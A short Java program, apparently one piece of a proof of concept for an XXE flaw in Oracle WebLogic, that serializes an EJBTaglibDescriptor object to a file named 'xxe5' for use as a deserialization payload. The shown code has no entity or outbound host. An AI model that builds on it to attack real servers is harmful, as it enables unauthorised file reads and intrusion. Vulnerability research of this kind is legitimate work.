import weblogic.servlet.ejb2jsp.dd.EJBTaglibDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class weblogicxxe5 {
    public static void main(String[] args) throws IOException {
        Object instance = getXXEObject();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe5"));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static Object getXXEObject() {
        EJBTaglibDescriptor umh = new EJBTaglibDescriptor();
        return umh;
    }
}
